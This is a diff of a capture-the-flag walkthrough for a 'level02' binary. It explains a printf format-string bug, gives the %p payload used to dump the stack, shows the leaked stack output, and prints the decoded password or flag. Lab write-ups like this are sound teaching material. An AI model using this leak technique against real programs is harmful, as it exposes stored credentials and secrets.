@@ -1,16 +1,12 @@
-Level02
+# level02 walkthrough
+#
 
-we have a binary called level02
-two prompt as usual username and password the program open first a file .pass in level03 home and put it in a buffer then ask for a user and password and put them in seperate buffers we have some kind of buffer overflow in the username it gets 100 bytes but the buffer only initialized with 14 bytes but the main focus is on the last printf "format string"
+level02 binary is vulnerable to a format string attack.
 
-it prints the username we can try to print pointers till we get the buffer who contains the .pass file's content so lets give as user name bunch of %p till we overflow to password because the buffer containing the .pass is between them in the stack 
+we see in line 53 on the source file, that printf is passed a buffer that the user controls
 
---[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
---[ Password: *****************************************
+plus the password is stored in a local variable on the main stack frame, we can dump the stack with %p in the buffer passed to printf
 
-we got as output :
+now we have to decode the password from hex string into ascii with the help of d.py
 
-0x7fffffffe4c0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
-
-the 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025 is the usernmae from the 8th place after that null pointers but then we found  0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394 it looks like a string and after that we find 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 that is the password when we decrypt the username and password to ascii its a bunch of %p lets do the same to the 5 pointers
-we created a python script to do that and we get the flag
+'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
